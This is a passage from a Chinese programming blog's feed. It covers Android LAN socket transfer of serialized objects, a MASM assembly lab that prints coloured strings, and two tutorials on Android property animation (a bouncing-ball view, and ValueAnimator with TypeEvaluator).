(IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Socket socket = serverSocket.accept();<span class="comment">//利用accept方法获得socket</span></span><br><span class="line">                InputStream inputStream;</span><br><span class="line">                inputStream = socket.getInputStream();<span class="comment">//获取输入流（来源自客户端）</span></span><br><span class="line">                ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);<span class="comment">//转换为对象输入流</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//获取udpDataPackage对象</span></span><br><span class="line">                UDPDataPackage udpDataPackage = (UDPDataPackage) objectInputStream.readObject();</span><br><span class="line">                OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">                ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(outputStream);</span><br><span class="line">                objectOutputStream.writeObject(udpDataPackage);<span class="comment">//将数据包写入输出流传送给客户端</span></span><br><span class="line">                objectOutputStream.flush();<span class="comment">//刷新流</span></span><br><span class="line"></span><br><span class="line">                objectOutputStream.close();</span><br><span class="line">                outputStream.close();</span><br><span class="line">                objectInputStream.close();</span><br><span class="line">                inputStream.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解释见注释。</p>
<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sendRequest</span><span class="params">(String ipAddress, UDPDataPackage udpDataPackage, Handler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.ipAddress = ipAddress;<span class="comment">//即为之前获取到的IP地址</span></span><br><span class="line">    <span class="keyword">this</span>.udpDataPackage = udpDataPackage;</span><br><span class="line">    <span class="keyword">this</span>.handler = handler;</span><br><span class="line">    thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> SendData());</span><br><span class="line">    thread.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SendData</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Socket socket = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            socket = <span class="keyword">new</span> Socket(ipAddress, SERVER_PORT);<span class="comment">//新建一个socket</span></span><br><span class="line">            socket.setReuseAddress(<span class="keyword">true</span>);</span><br><span class="line">            socket.setKeepAlive(<span class="keyword">true</span>);<span class="comment">//设置socket属性</span></span><br><span class="line">            socket.setSoTimeout(<span class="number">5000</span>);<span class="comment">//设置超时</span></span><br><span class="line">			<span class="comment">//获得一个对象输出流</span></span><br><span class="line">            OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(outputStream);</span><br><span class="line">            objectOutputStream.writeObject(udpDataPackage);<span class="comment">//将请求包写入输出流（传送给服务端）</span></span><br><span class="line">			<span class="comment">//获取服务端返回的流</span></span><br><span class="line">            InputStream inputStream = socket.getInputStream();</span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">            udpDataPackage dataPackage = (udpDataPackage) objectInputStream.readObject();<span class="comment">//获取到返回的数据对象</span></span><br><span class="line">			<span class="comment">//转发给handler进行处理</span></span><br><span class="line">            Message msg = <span class="keyword">new</span> Message();</span><br><span class="line">            msg.what = SERVER_PORT;</span><br><span class="line">            msg.obj = dataPackage;</span><br><span class="line">            handler.sendMessage(msg);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SocketTimeoutException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (socket != <span class="keyword">null</span>) socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            sendRequest(ipAddress, udpDataPackage, handler);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解释见注释。</p>
<hr>
<p>可以看见TCP连接还是比较简单的，设置好<code>socket</code>并获取到输入输出流以后就可以把服务端当作本地流一样操作，具体的网络通信实现过程被隐藏了，有了流以后就可以进行所有能对流进行的操作了。到这里，我们要实现的局域网数据传输已经完成了。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>王爽汇编语言第三版实验9 双循环实现</title>
    <url>/2017/04/10/assembly_wang_lab_9/</url>
    <content><![CDATA[<p>编程：在屏幕中间分别显示绿色、绿底红色、白底蓝色的字符串<code>welcome to masm!</code>。</p>
<p>效果图：</p>
<p><img src="/images/assembly_9.jpg" alt=""></p>
<p>采用了双循环嵌套的写法，外层控制输出行数，内层逐字符读取ASCII码与对应行的属性。</p>
<blockquote>
<p>  把<code>loop s1</code>改为<code>loop s2</code>有惊喜哦</p>
</blockquote>
<p>所有实验答案<a href="http://blog.duskdragon.com/2017/03/09/%E7%8E%8B%E7%88%BD%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%B8%89%E7%89%88%E5%AE%9E%E9%AA%8C/" target="_blank" rel="noopener">在这里</a></p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code,ss:data</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">    mov ax,0b800h</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov bx,1760</span><br><span class="line"></span><br><span class="line">    mov ax,data</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov si,0</span><br><span class="line"></span><br><span class="line">    mov bp,0</span><br><span class="line">    mov cx,3</span><br><span class="line">s1: mov ss:[19],cx</span><br><span class="line">    mov si,0</span><br><span class="line">    mov cx,16</span><br><span class="line">s2: mov di,si</span><br><span class="line">    add di,di</span><br><span class="line">    mov al,ss:[si]</span><br><span class="line">    mov [bx+64+di],al</span><br><span class="line">    mov al,ss:[16+bp]</span><br><span class="line">    mov [bx+65+di],al</span><br><span class="line">    inc si</span><br><span class="line">    loop s2</span><br><span class="line">    inc bp</span><br><span class="line">    add bx,160</span><br><span class="line">    mov cx,ss:[19]</span><br><span class="line">    loop s1</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">code ends</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &#39;welcome to masm!&#39;</span><br><span class="line">    db 00000010b,00100100b,01110001b</span><br><span class="line">    dw 0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>Assembly</tag>
      </tags>
  </entry>
  <entry>
    <title>Android PropertyAnimation 属性动画（二）弹跳小球实例</title>
    <url>/2017/04/02/android_property_animation_2/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://github.com/viseator/AndroidAnimatorBounceBallDemo" target="_blank" rel="noopener">GitHub完整代码</a></p>
<p><a href="http://www.viseator.com/2017/03/26/android_property_animation_1/">上篇博客</a>简单介绍了属性动画的原理，这篇博客将会以一个简单的实例来运用上之前讲的内容，并对<code>Animator</code>的几个回调方法进行讲解。</p>
<p>目标是自定义一个<code>View</code>，在画布上绘制一个小球，点击屏幕后小球从顶部自由下落，落到底边后反弹，反弹损失一半的能量，也就是说小球只能上升到下落时一半的高度，再重复这个过程直到退出程序。如图：</p>
<p><img src="/images/android_animator.gif" alt=""></p>
<a id="more"></a>
<h2 id="创建自定义View"><a href="#创建自定义View" class="headerlink" title="创建自定义View"></a>创建自定义View</h2><p>首先我们要创建一个自定义<code>View</code>，这里我就采用继承<code>LinearLayout</code>的方式来创建这个<code>View</code>，但要注意<code>LinearLayout</code>默认是不绘制自身的，需要在<code>onDraw()</code>方法之前适当的时候调用<code>setWillNotDraw(false);</code>令其进行绘制。</p>
<p>在继承<code>LinearLayout</code>的同时我们要实现全部三个构造方法，否则xml文件的预览解析会出现问题：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">VView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">VView</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">VView</span><span class="params">(Context context, AttributeSet attrs, <span class="keyword">int</span> defStyleAttr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建好自定义<code>View</code>后，我们就可以在对应的layout xml布局文件中用完整包名+类名的方式使用我们的自定义<code>View</code>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.viseator.viewtest.VView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>
<p>同时，我们在绘制之前的<code>onMeasure()</code>方法中调用<code>setWillNotDraw(false);</code>使自定义<code>View</code>可以绘制：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMeasure</span><span class="params">(<span class="keyword">int</span> widthMeasureSpec, <span class="keyword">int</span> heightMeasureSpec)</span> </span>&#123;</span><br><span class="line">    setWillNotDraw(<span class="keyword">false</span>);</span><br><span class="line">    setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">super</span>.onMeasure(widthMeasureSpec, heightMeasureSpec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里也调用了<code>setOnClickListener()</code>注册之后的点击事件。</p>
<h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><h3 id="小球的绘制"><a href="#小球的绘制" class="headerlink" title="小球的绘制"></a>小球的绘制</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ValueAnimator animator;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> radius = <span class="number">50</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> xPos = radius;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> yPos = radius;</span><br><span class="line"><span class="keyword">private</span> Paint paint = <span class="keyword">new</span> Paint();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDraw</span><span class="params">(Canvas canvas)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onDraw(canvas);</span><br><span class="line">	<span class="keyword">if</span> (animator == <span class="keyword">null</span>) &#123;</span><br><span class="line">		canvasHeight = canvas.getHeight() - radius;    		</span><br><span class="line">		paint.setColor(getResources().getColor(R.color.Gray));</span><br><span class="line">		paint.setAntiAlias(<span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    drawCircle(canvas);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">drawCircle</span><span class="params">(Canvas canvas)</span> </span>&#123;</span><br><span class="line">	canvas.drawCircle(xPos, yPos, radius, paint);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里第10行对是否是第一次绘制进行判断并将画布大小保存到<code>canvasHeight</code>供之后的绘制使用（之后的绘制的坐标需要相对于画布的坐标）并设置<code>paint</code>的属性。</p>
<p><code>drawCircle()</code>方法也非常简单，只是调用<code>canvas</code>提供的<code>drawCircle()</code>方法指定位置与半径和之前设置的<code>paint</code>，调用后就会在屏幕上的对应位置绘制一个小球。</p>
<h3 id="下落动画的绘制"><a href="#下落动画的绘制" class="headerlink" title="下落动画的绘制"></a>下落动画的绘制</h3><p>下面就要让小球“动”起来，其实并不是小球发生了移动，只是我们不停地改变小球绘制的位置，当绘制的速率（帧率）大于24帧时的，就在视觉上变成了流畅的动画。也就是说，我们需要使用<code>Animator</code>连续地改变小球的位置，为了实现加速的效果，位置的改变速率应该随时间增加，也就是需要我们上一篇博客提到的<code>Evaluator</code>来实现。</p>
<h4 id="animator的初始化"><a href="#animator的初始化" class="headerlink" title="animator的初始化"></a>animator的初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">    animator = ValueAnimator.ofInt(start, end);</span><br><span class="line">    animator.setDuration(<span class="number">1000</span>);</span><br><span class="line">    animator.setRepeatCount(ValueAnimator.INFINITE);</span><br><span class="line">    animator.setRepeatMode(ValueAnimator.RESTART);</span><br><span class="line">    animator.setInterpolator(<span class="keyword">new</span> AccelerateInterpolator(rate));</span><br><span class="line">    animator.addUpdateListener(<span class="keyword">this</span>);</span><br><span class="line">    animator.addListener(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写成一个初始化方法便于重新初始化。</p>
<p>第2行将传入的值区间的开始与结束值作为参数获得了一个值为<code>int</code>的<code>ValueAnimator</code>。</p>
<p>第3行设置了动画的时间为1秒。</p>
<p>第4、5行分别设置了动画的重复次数为无限次，重复模式为重新开始，顾名思义，动画可以重复进行，重新开始的重复模式意味着一次动画结束之后数值重新从<code>start</code>到<code>end</code>进行改变，也可以设置重复的模式为反向，即一次动画结束之后数值从<code>end</code>到<code>start</code>变化。</p>
<p>第六行为<code>animator</code>设置了一个库中提供的<code>AccelerateInterpolator</code>即加速插值器，这就是我们实现加速效果的关键，上篇之中已经看过它的源码，默认时返回的最终动画进行百分比是时间百分比的平方，达到了位置随着时间的平方变化，也就是实现了加速下落的效果。</p>
<p>第7、8两行分别为<code>animator</code>设置了一个<code>UpdateListener</code>用于监听数值变化，一个<code>Listener</code>用于监听<code>animator</code>本身开始、停止、重复。</p>
<h4 id="完成下落动画"><a href="#完成下落动画" class="headerlink" title="完成下落动画"></a>完成下落动画</h4><p>创建好了<code>ValueAnimator</code>，下一步就是在适合的时候在画布上重新绘制位置参数被<code>animator</code>改变后的小球。注意到我们之前小球的y坐标存储在<code>yPos</code>变量中，我们只要适时令<code>yPos</code>等于改变后的值再通过<code>invalidate()</code>方法进入<code>onDraw()</code>方法让<code>View</code>按小球的参数重新进行绘制就可以了。</p>
<p><code>animator</code>的<code>ValueAnimator.AnimatorUpdateListener</code>为我们提供了一个及时刷新<code>View</code>的时机，之前为<code>animator</code>注册一个<code>UpdateListener</code>之后，每当<code>animator</code>的值发生改变时，<code>onAniamtionUpdate()</code>就会被回调。</p>
<p>那我们就可以在这个回调方法中为<code>yPos</code>设置新的值并令<code>View</code>重新绘制：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationUpdate</span><span class="params">(ValueAnimator animation)</span> </span>&#123;</span><br><span class="line">    yPos = (<span class="keyword">int</span>) animation.getAnimatedValue();</span><br><span class="line">    invalidate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，我们只要启动<code>animator</code>令它的值开始变化，就会不断地调用<code>onAnimationUpdate()</code>重绘<code>View</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    init(radius, canvasHeight);</span><br><span class="line">	animationHeight = canvasHeight + radius;</span><br><span class="line">    animator.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>start()</code>方法令<code>animator</code>开始。</p>
<p>到这里，我们已经可以看到点击屏幕后小球下落到底部并停止的效果。</p>
<h3 id="回弹效果实现"><a href="#回弹效果实现" class="headerlink" title="回弹效果实现"></a>回弹效果实现</h3><p>我们之前已经为<code>animator</code>设置了无限重复，并且模式为重新开始，那么要做到回弹的效果，就要在小球落到底边（动画完成）之后，为小球设置新的初始值与最终值，让小球从最低点回到落下时一半的高度。高度数据我们在<code>onClick()</code>中的第4行（上面代码）已经初始化为了相对于画布的高度，之后再使用时只需把它除2就可以表示圆心距底边的高度了。</p>
<p><code>Animator.AnimatorListener</code>为我们提供了一系列方法用于监听<code>animator</code>状态的变化（而不是数值）：</p>
<p><img src="/images/AnimatorListener.jpg" alt=""></p>
<p>（除金色为Android 8新增外）依次为动画取消，动画结束，动画开始重复，动画开始。</p>
<p>这里我们就需要在<code>onAnimationReapt()</code>回调中为动画设置新的初值与结束数值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationRepeat</span><span class="params">(Animator animation)</span> </span>&#123;</span><br><span class="line">    ValueAnimator vAnimation = (ValueAnimator) animation;</span><br><span class="line">    <span class="keyword">if</span> (isDown) &#123;</span><br><span class="line">        animationHeight = (<span class="keyword">int</span>) (animationHeight * <span class="number">0.5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    isDown = !isDown;</span><br><span class="line">    <span class="keyword">if</span> (isDown) &#123;</span><br><span class="line">        vAnimation.setIntValues(canvasHeight - animationHeight, canvasHeight);</span><br><span class="line">        vAnimation.setInterpolator(<span class="keyword">new</span> AccelerateInterpolator());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        vAnimation.setIntValues(canvasHeight, canvasHeight - animationHeight);</span><br><span class="line">        vAnimation.setInterpolator(<span class="keyword">new</span> DecelerateInterpolator());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回调参数中的<code>animation</code>就是回调这个函数的<code>animator</code>，第3行对其进行一个类型转换。</p>
<p>这里我们使用了一个<code>isDown</code>参数来判断是否是下落过程，如果上个动画是下落过程，就将<code>animationHeight</code>减半。</p>
<p>第7行把<code>isDown</code>置反，再根据<code>isDown</code>的判断使用<code>setIntValues()</code>方法为<code>animator</code>设置新的范围，使用<code>setInterpolator()</code>方法设置新的插值器，注意上升时使用的应该是<code>DecelerateInterpolater</code>减速上升。</p>
<p>这样在新的动画开始时属性改变的范围就得到了改变，也就使得小球可以反弹了。</p>
<p>为了让每一次点击时动画都可以重新开始，在<code>onClick()</code>方法中加入几行初始化代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (animator != <span class="keyword">null</span>) &#123;</span><br><span class="line">        animator.end();</span><br><span class="line">    &#125;</span><br><span class="line">    init(radius, canvasHeight);</span><br><span class="line">    animationHeight = canvasHeight + radius;</span><br><span class="line">    isDown = <span class="keyword">true</span>;</span><br><span class="line">    animator.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里第3-5行让如果存在的<code>animator</code>停止，否则新动画无法启动。</p>
<p>下篇博客将会从源码角度继续探索<code>animator</code>的实现原理和更高级的一些特性。</p>
<p><a href="https://github.com/viseator/AndroidAnimatorBounceBallDemo" target="_blank" rel="noopener">GitHub完整代码</a></p>
]]></content>
      <categories>
        <category>Android</category>
        <category>UI</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>UI</tag>
        <tag>Animation</tag>
      </tags>
  </entry>
  <entry>
    <title>Android PropertyAnimation 属性动画（一）初探</title>
    <url>/2017/03/26/android_property_animation_1/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相对于静态的页面，动画往往能更直观地表达所需的信息，在UI开发过程中起着相当大的作用。</p>
<p>Android为我们提供了一系列实现动画效果的方法，<code>PropertyAnimaiton</code>是最常见也是最实用的一种，如同它的名字一样，它的实现方式是通过改变对象的一系列属性值来改变对象的状态， 例如动态地改变绘制的位置就可以实现绘制物体的移动效果，动态地改变对象的显示状态可以实现闪烁效果。</p>
<h2 id="Animator概览"><a href="#Animator概览" class="headerlink" title="Animator概览"></a>Animator概览</h2><p>Android提供的实现属性动画的工具是<code>android.animation.Animator</code>这个类，它的使用需要配合<code>animation</code>包下的其他工具类，这个类的功能是什么，我们要如何使用它来实现属性动画呢？</p>
<a id="more"></a>
<p>我们可以将<code>Animator</code>理解为<code>Android</code>为我们提供的一个按我们的需要在一定时间段内<strong>连续地</strong>计算并返回值的工具，这个值可以是通用的整型、浮点型，也可以是我们自定义的类型。</p>
<p>我们可以设置返回值的范围，并可以控制值变化的快慢，例如实现自由落体下落的物体时我们需要让高度值以一个越来越快的速度降低。</p>
<p>这里的连续需要注意，实际上是不可能产生真正意义上的连续值的，但是如果<strong>在绘制过程中计算这个值的速度小于绘制一帧所需要的时间</strong>，那么我们就可以在视觉上认为这个值是在连续改变的。这一点也是理解其作用的关键：我们很难去写出一个可以随时获取连续值的工具，而<code>Animator</code>正是一个满足我们这个需求的一个通用工具。</p>
<p>通过将<code>Animator</code>与<code>View</code>的绘制过程结合，就可以实现绝大多数的动画效果， 但是<code>Animator</code>也不只局限在使用在绘制动画，只要是有相似需求的地方都可以使用它来实现， 同时由于属性动画只针对属性进行修改，与被修改对象之前几乎没有耦合，不需要对被修改对象作出改变，可以设置方式也多种多样，这些都是动画的另一种实现方法<code>ViewAnimator</code>所无法做到的，所以我属性动画是现在实现动画效果的普遍做法。</p>
<h2 id="使用Animator"><a href="#使用Animator" class="headerlink" title="使用Animator"></a>使用Animator</h2><h3 id="Animator子类"><a href="#Animator子类" class="headerlink" title="Animator子类"></a>Animator子类</h3><p>下面就来看看如何使用<code>Animator</code>满足我们的需求。</p>
<p>我们使用<code>Animator</code>可以分为两个步骤，一是进行数值的计算，二是将计算出的数值设置到对应的对象上。而<code>Animator</code>有着三个子类：<code>ValueAnimator</code> <code>ObjectAnimator</code> <code>AnimatorSet</code>。</p>
<ul>
<li><code>ValueAnimator</code>实现了上述过程的第一个步骤：进行数值的计算。第二个步骤则需要我们重写它的回调在值发生改变时候手动地为对象更新属性值。</li>
<li><code>ObjectAnimator</code>则在其基础上进行了进一步的封装，加入了一些方法使得它可以绑定一个对象，在数值改变的同时对对象的属性进行更新。</li>
<li><code>AnimatorSet</code>可以对<code>Animator</code>进行组合，让它们之间进行联动，例如可以设置一个动画根据另一个动画的状态来决定是否开始、暂停或停止。</li>
</ul>
<p>可以看到，<code>ValueAnimator</code>提供了一个<code>Animator</code>最核心的内容，也是使用中最为灵活的一个。<code>ObjectAnimator</code>由于绑定了相应的对象，在使用上会受一些限制。<code>AnimatorSet</code>专用于需要组合动画的场景。</p>
<h3 id="ValueAnimator"><a href="#ValueAnimator" class="headerlink" title="ValueAnimator"></a>ValueAnimator</h3><p>在这篇博客中，我们关注最为核心的<code>ValueAnimator</code>。</p>
<h4 id="关键属性"><a href="#关键属性" class="headerlink" title="关键属性"></a>关键属性</h4><p><code>ValueAnimator</code>对象内部维护了一系列属性来保存所需的各种信息。</p>
<ul>
<li><code>Duration</code>：动画的持续时间，通过<code>setDuration()</code>方法设置</li>
<li><code>Repeat count and behavior</code>：重复计数与重复模式，我们可以通过设置这两个属性来控制动画是否重复以及重复的次数，通过<code>setRepeatCount()</code>与<code>setRepeatMode()</code>方法设置</li>
<li><code>Frame refresh delay</code>：帧刷新延迟，也就是计算两帧动画之间的间隔时间，但这个时间只是<code>Animator</code>尽力去保持的值，具体的间隔时间会由于系统负载与性能的不同而不同，同时设置它的方法为一个静态方法：<code>ValueAnimator.setFrameDelay()</code>，会被设置到所有的<code>Animator</code>上，这是因为这些<code>Animator</code>都在同一个时间循环中。这个属性也有可能会被忽略如果动画系统采用了内部的计时来源，例如<code>vsync</code>来计算属性。同时这个方法需要在与<code>start()</code>方法相同的进程中调用</li>
<li><code>Time interpolation</code>：时间插值器，是我们实现不同动画效果的关键，每一时刻所返回的数值由它决定，后文会详细讲</li>
</ul>
<h4 id="初始化与TypeEvaluator"><a href="#初始化与TypeEvaluator" class="headerlink" title="初始化与TypeEvaluator"></a>初始化与TypeEvaluator</h4><p><code>ValueAnimator</code>对象的构造函数只由内部使用，获取<code>ValueAnimator</code>对象的方法是调用它的工厂方法：</p>
<p><code>ValueAnimator.ofArgb()</code></p>
<p><code>ValueAnimator.ofInt()</code></p>
<p><code>ValueAnimator.ofFloat()</code></p>
<p><code>ValueAnimator.ofObject()</code></p>
<p><code>ValueAnimator.ofPropertyValuesHolder()</code> //本篇未涉及，下一篇进行讲解</p>
<p>前三个可以看作是<code>ValueAnimator</code>为我们提供的初始化方式，它们的参数都是对应类型的长度可变参数:<code>(Type ...values)</code>，我们需要提供一个以上的参数，<code>ValueAnimator</code>最终提供的值会在这些值之前变动。</p>
<p>一般情况下这里提供的<code>Argb</code>（用于颜色值的变化）和整型、浮点值基本可以满足我们的需求，但是某些时候我们需要结果是我们自定义的一些对象，这个时候就需要用到<code>TypeEvaluator&lt;&gt;</code>接口了，与这个接口对应的工厂方法是<code>ValueAnimator.ofObject()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">ValueAnimator <span class="title">ofObject</span> <span class="params">(TypeEvaluator evaluator, </span></span></span><br><span class="line"><span class="function"><span class="params">                Object... values)</span></span></span><br></pre></td></tr></table></figure>
<p>这里的可变参数类型变为了<code>Object</code>，同时还需要我们提供一个<code>TypeEvaluator&lt;&gt;</code>，用于“告诉”<code>Animator</code>如何返回这个<code>Object</code>值。</p>
<hr>
<p><code>TypeEvaluator&lt;&gt;</code>接口并不复杂，只有一个方法需要我们重写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">T <span class="title">evaluate</span> <span class="params">(<span class="keyword">float</span> fraction, </span></span></span><br><span class="line"><span class="function"><span class="params">                T startValue, </span></span></span><br><span class="line"><span class="function"><span class="params">                T endValue)</span></span></span><br></pre></td></tr></table></figure>
<p><code>startValue</code>与<code>endValue</code>非常好理解，就是我们在获取<code>Animator</code>时指定的值的起始值和结束值。类型与返回类型一致，当然都是我们自定义的类型。</p>
<p>这里的<code>fraction</code>就是决定我们最终返回值的关键参数。我们可以把这个<code>fraction</code>理解为<code>animator</code>提供给我们的最终的数值改变的比例，以小数表示，小于0表示低于<code>startValue</code>，大于0表示超出<code>endValue</code>，0-1之间表示在<code>startValue</code>与<code>endValue</code>之间。我们要做的就是把这个值转换为在起始和结果范围之间的合适的对象值。</p>
<p>例如，对于基本的浮点类型，默认的<code>FloatEvaluator</code>是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Float <span class="title">evaluate</span><span class="params">(<span class="keyword">float</span> fraction, Number startValue, Number endValue)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">float</span> startFloat = startValue.floatValue();</span><br><span class="line">    <span class="keyword">return</span> startFloat + fraction * (endValue.floatValue() - startFloat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，就是相当于把<code>fraction</code>所表示的比例“投射”到了我们所需要的数据对象上，这里是浮点类型。如果使用我们的自定义类型，我们必须为自己的类型定义这样的操作。</p>
<p><strong>注意：</strong>这里要求我们必须将<code>fraction</code><strong>线性</strong>地反应到对应的类型上，因为<code>fraction</code>反映的是最终的动画进度，我们必须如实地按照这个进度改变我们的属性，所以需要将result = x0 + t * (x1 - x0)`这样的形式反映到我们自己的对象上。</p>
<p>自定义了<code>TypeEvaluator</code>以后就可以作为参数使用在上面的<code>obObject()</code>工厂方法中了。</p>
<h4 id="插补细分器-Interpolators"><a href="#插补细分器-Interpolators" class="headerlink" title="插补细分器(Interpolators)"></a>插补细分器(<code>Interpolators</code>)</h4><p>下面介绍使用<code>ValueAnimator</code>控制值变化过程中最为重要的一个概念：插补细分器(<code>Interpolators</code>)。</p>
<p>它实际上是一个关于时间的函数， 根据时刻的不同来返回不同的值，进而来控制最后的输出的值。那么它是如何表示的呢？</p>
